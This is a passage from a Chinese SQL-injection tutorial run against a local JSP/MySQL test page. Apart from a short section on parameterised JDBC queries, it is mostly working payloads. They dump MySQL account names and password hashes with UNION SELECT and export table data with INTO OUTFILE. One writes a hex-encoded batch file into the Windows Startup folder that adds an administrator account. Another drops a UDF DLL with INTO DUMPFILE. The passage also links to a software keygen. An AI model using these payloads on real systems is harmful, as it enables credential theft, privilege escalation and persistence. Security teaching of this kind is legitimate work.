关于注入页面报错： 
如果发现页面抛出异常，那么得从两个方面去看问题，传统的SQL注入在页面报错以后
肯定没法直接从页面获取到数据信息。如果报错后SQL没有往下执行那么不管你提交什么
SQL注入语句都是无效的，如果只是普通的错误可以根据错误信息进行参数修改之类继续
SQL注入。 
假设我们的id改为int类型： 
int id = Integer.parseInt(request.getParameter("id")); 
第 48 页 
程序在接受参数后把一个字符串转换成int(整型)的时候发生异常，那么后面的代码是
不会接着执行的哦，所以SQL注入也会失败。 
Spring中如何安全的拼SQL(JDBC同理)： 
对于常见的SQL注入采用预编译就行了，但是很多时候简单的条件较多或较为复杂的时
候很多人都想偷懒拼SQL总是似乎免不了的。  
写了个这样的多条件查询条件自动匹配：  
public static String SQL_FORUM_CLASS_SETTING = "SELECT * from bjcyw_forum_forum 
where 1=1 ";  
public List> getForumClass(Map forum) {  
    StringBuilder sql=new StringBuilder(SQL_FORUM_CLASS_SETTING);  
    List ls=new ArrayList();  
    if (forum.size()>0) {  
      for (String key : forum.keySet()) {  
        Object obj[]=(Object [])forum.get(key);  
        sql = SqlHelper.selectHelper(sql, obj);  
        if ("like".equalsIgnoreCase(obj[2].toString().trim())) {  
          ls.add("%"+obj[1]+"%");  
        }else {  
          ls.add(obj[1]);  
        }  
      }  
    }  
    return jdbcTemplate.queryForList(sql.toString(),(Object[])ls.toArray());  
  } 
第 49 页 
selectHelper方法： 
public static StringBuilder selectHelper(StringBuilder sql, Object obj[]){  
    if (Constants.SQL_HELPER_LIKE.equalsIgnoreCase(obj[2].toString())) {  
      sql.append(" AND "+obj[0]+" like ?");  
    }else if (Constants.SQL_HELPER_EQUAL.equalsIgnoreCase(obj[2].toString())) 
{  
      sql.append(" AND "+obj[0]+" = ?");  
    }else if 
(Constants.SQL_HELPER_GREATERTHAN.equalsIgnoreCase(obj[2].toString())) {  
      sql.append(" AND "+obj[0]+" > ?");  
    }else if 
(Constants.SQL_HELPER_LESSTHAN.equalsIgnoreCase(obj[2].toString())) {  
      sql.append(" AND "+obj[0]+" < ?");  
    }else if 
(Constants.SQL_HELPER_NOTEQUAL.equalsIgnoreCase(obj[2].toString())) {  
      sql.append(" AND "+obj[0]+" != ?");  
    }  
    return sql;  
  } 
信任客户端的参数一切参数只匹配查询条件，把参数和条件自动装配到框架。如果客户
端提交了危险的SQL也没有关系在query的时候是会预编译。  
（不贴了原文在：http://zone.wooyun.org/content/2448） 
4、转战 Web 平台 
看完了 SQL 注入在控制台下的表现，如果对上面还不甚清楚的同学继续看下面的 Web
注入。 
首先我们了解下 Web 当中的 SQL 注入产生的原因: 
第 50 页 
Mysql 篇： 
数据库结构上面已经声明，现在有以下 Jsp 页面，逻辑跟上面注入一致： 
浏览器访问：http://localhost/SqlInjection/index.jsp?id=1 
第 51 页 
上面我们已经知道了查询的字段数是 4，现在构建联合查询，其中的 1，2，3 只是我们用来
占位查看字段在页面对应的具体的输出。在 HackBar 执行我们的 SQL 注入，查看效果和执行
情况： 
Mysql 查询和注入技巧： 
只要是从事渗透测试工作的同学或者对 Web 比较喜爱的同学强荐大家学习下 SQL 语句
和 Web 开发基础，SQL 管理客户端有一个神器叫 Navicat。支持 MySQL, SQL Server, SQLite, 
Oracle 和 PostgreSQL databases。官方下载地址：http://www.navicat.com/download 
不过需要注册，注册机：http://pan.baidu.com/share/link?shareid=271653&uk=1076602916 其
次是下载吧有全套的下载。 
第 52 页 
似乎很多人都知道 Mysql 有个数据库叫 information_schema 里面存储了很多跟 Mysql
有关的信息，但是不知道里面具体都有些什么，有时间大家可以抽空看下。Mysql 的 sechema
都存在于此，包含了字段、表、元数据等各种信息。也就是对于 Mysql 来说创建一张表后对
应的表信息会存储到 information_schema 里面，而且可以用 SQL 语句查询。 
使用 Navicat 构建 SQL 查询语句： 
当我们在 SQL 注入当中找到用户或管理员所在的表是非常重要的，而当我们想要快速
找到跟用户相关的数据库表时候在 Mysql 里面就可以合理的使用 information_schema 去查
询。构建 SQL 查询获取所有当前数据库当中数据库表名里面带有 user 关键字的演示： 
第 53 页 
查询包含 user 关键字的表名的结果： 
假设已知某个网站用户数据非常大，我们可以通过上面构建的 SQL 去找到对应可能存
在用户数据信息的表。查询 Mysql 所有数据库中所有表名带有 user 关键字的表，并且按照
表的行数降序排列： 
SELECT  
i.TABLE_NAME,i.TABLE_ROWS  
FROM information_schema.`TABLES` AS i  
WHERE i.TABLE_NAME  
LIKE '%user%'  
ORDER BY i.TABLE_ROWS  
DESC 
查只在当前数据库查询： 
SELECT  
i.TABLE_NAME,i.TABLE_ROWS  
FROM information_schema.`TABLES` AS i  
WHERE i.TABLE_NAME LIKE '%user%'  
AND i.TABLE_SCHEMA = database()  
ORDER BY i.TABLE_ROWS  
DESC 
查询指定数据库： 
第 54 页 
查询字段当中带有 user 关键字的所有的表名和数据库名： 
SELECT  
i.TABLE_SCHEMA,i.TABLE_NAME,i.COLUMN_NAME  
FROM information_schema.`COLUMNS` AS i  
WHERE i.COLUMN_NAME LIKE '%user%' 
第 55 页 
CONCAT： 
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 
1,2,3,CONCAT('MysqlUser:',User,'------MysqlPassword:',Password) FROM mysql.`user` limit 
0,1
GROUP_CONCAT 
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 
1,2,3,GROUP_CONCAT('MysqlUser:',User,'------MysqlPassword:',Password) FROM mysql.`user` 
limit 0,1 
注入点友情备份: 
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select '','',corps_name,corps_url from 
corps into outfile'E:/soft/apache-tomcat-7.0.37/webapps/SqlInjection/1.txt' 
注入在windows下默认是E:\如果用”\”去表示路径的话需要转换成E:\\而更方便的方式是直接
用/去表示即E:/。 当我们知道WEB路径的情况下而又有outfile权限直接导出数据库中的用户
信息，连getshell都省了。
第 56 页 
而如果是在一些极端的情况下无法直接outfile我们可以合理的利用concat和
GROUP_CONCAT去把数据显示到页面，如果数据量特别大，我们可以用concat加上limit去控
制显示的数量。比如每次从页面获取几百条数据？写一个工具去请求构建好的SQL注入点然
后把页面的数据取下来，那么数据库的表信息也可以直接从注入点全部取出来。 
注入点root权限提权： 
1、写启动项： 
这个算是非常简单的了，直接写到windows的启动目录就行了，我测试的系统是
windows7直接写到:C:/Users/selina/AppData/Roaming/Microsoft/Windows/Start 
Menu/Programs/Startup目录就行了。 
用HackBar去请求一下链接就能过把bat写入到我们的windows的启动菜单了，不过得注
意的是360那个狗兔崽子： 
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select  
0x6E65742075736572207975616E7A20313233202F6164642026206E6574206C6F63616C67
726F75702061646D696E6973747261746F7273207975616E7A202F616464,'','','' 
into outfile'C:/Users/selina/AppData/Roaming/Microsoft/Windows/Start 
Menu/Programs/Startup/1.bat' 
第 57 页 
2、失败的注入点UDF提权尝试： 
MYSQL 提权的方式挺多的，并不局限于 udf、mof、写 windows 启动目录、SQL 语句替
换 sethc 实现后门等，这里以 udf 为例，其实 udf 挺麻烦的，如果麻烦的东东你都能搞定，
简单的自然就能过搞定了。 
在进行 mysql 的 udf 提权的时候需要注意的是 mysql 的版本，mysql5.1 以下导入到
windows 目录就行了，而 mysql<=5.1 需要导入到插件目录。我测试的是 Mysql 5.5.27 我们的
首要任务就是找到 mysql 插件路径。 
http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 1,2,3,@@plugin_dir 
获取插件目录方式： 
select @@plugin_dir 
select @@basedir 
show variables like ‘%plugins%’  
通过 MYSQL 预留的变量很轻易的就找到了 mysql 所在目录，那我们需要把 udf 导出的
绝对路径就应该是：D:/install/dev/mysql5.5/lib/plugin/udf.dll。现在我们要做的就是怎样通过
SQL 注入去把这 udf 导出到上述目录了。 
我先说下我是怎么从错误的方法到正确导入的一个过程吧。首先我执行了这么一个
第 58 页 
SQL： 
SELECT * from corps where id = 1 and 1=2 union select '','','',(CONVERT(0xudf 的十六进
制 ,CHAR)) INTO DUMPFILE'D:/install/dev/mysql5.5/lib/plugin/udf.dll'，因为在命令行或执行单
条语句的时候转换成 char 去 dumpfile 的时候是可以成功导出二进制文件的。 
我们用浏览器浏览网页的时候都是以 GET 方式去提交的，而如果我用 GET 请求去传这
个十六进制的 udf 的话显然会超过 GET 请求的限制，于是我简单的构建了一个 POST 请求去
把一个 110K 的 0x 传到后端。 
用 hackbar 去发送一个 post 请求发现失败了，一定是我打开方式不对，呵呵。随手写了
个表单提交下： 
下载地址: http://pan.baidu.com/share/link?shareid=1711769621&uk=1076602916  
第 59 页 
提交表单以后发现文件是写进去了，但是为什么就只有 84 字节捏？ 
难道是数据传输的时候被截断了？不至于吧，于是用 navicat 执行上面的语句： 
我似乎傻逼了，因为查询结果还是只有 84 字节，结果显然不是我想要的。84 字节，不
带这么坑的。一计不成又生二计。 
不让我直接 dumpfile 那我间接的去写总行吧？ 
第 60 页 
1 and 1=2 union select '','','',0xUDF 转换后的 16 进制 INTO 
outFILE'D:/install/dev/mysql5.5/lib/plugin/udf.txt'发现格式不对，给 hex 加上单引号以字符串
方式写入试下: 1 and 1=2 union select '','','',’0xUDF 转换后的 16 进制’  INTO 
outFILE'D:/install/dev/mysql5.5/lib/plugin/udf.txt' 
这次写入的起码是 hex 了吧，再 load_file 到查询里面不就行了吗？我们知道 load_file
得到的肯定是一个 blob 吧。 
第 61 页 
那么在注入点这么去构建一下不就行了： 
其实这都已经二到家了，这跟第一次提交的数据根本就没有两样。Load file 在这里依旧
被转换成了 0x，我想这不行的话那么应该就只能在 blob 字段去 load_file 才能成功吧，因为
现在 load 到了一个字段类型是 text 的位置里面。估计是被当字符串处理了，但是很显然是
没法去找个 blob 的字段的，(用上面去 information_schema 去找应该能找到)。也就是说现在
需要的是一个 blob 去临时的存储一下。又因为我们知道 MYSQL 是不支持多行查询的，所以
我们根本就没有办法去建表(想过 copy 查询建表，但是显然是行不通的)。 
这不科学，一定是打开方式不对。CAST 和 CONVERT 转换成 CHAR 都不行。能转换成
blob 之类的吗？CONVERT(0xsbsbsb,BLOB)发现失败了，把 BLOB 换成 BINARY 发现成功执行
了。 
于是用构建的表单再次执行下面的语句： 
SELECT * from corps where id = 1 and 1=2 union select '','','', CONVERT(0x 不解释,BINARY) INTO 
DUMPFILE'D:/install/dev/mysql5.5/lib/plugin/udf.dll' 
第 62 页 
这次执行成功了，哦多么痛的领悟……一开始把 CHAR 写成 BINARY 不就搞定了，二的太
明显了。其实上面的二根本就不是事儿，更二的是当我要执行的时候恍然发现根本就没有办
法去创建 function 啊！ O shit shift~前面已经说了 Mysql Driver 在 pstt.executeQuery()是不支
持多行查询的，一个 select 再怎么也不能跟 create 同时执行。为了不影响大家心情还是继
续写下去吧，命令行建立一个 function，然后在注入点注入（如果有前人已经创建 udf 的情
况下可以直接利用）： 
因为没有办法去创建一个 function 所以用注入点实现 udf 提权在上一步就死了，通过在
第 63 页 
命令行执行创建 function 只能算是心理安慰了，只要完成了 create function 那一步我们就真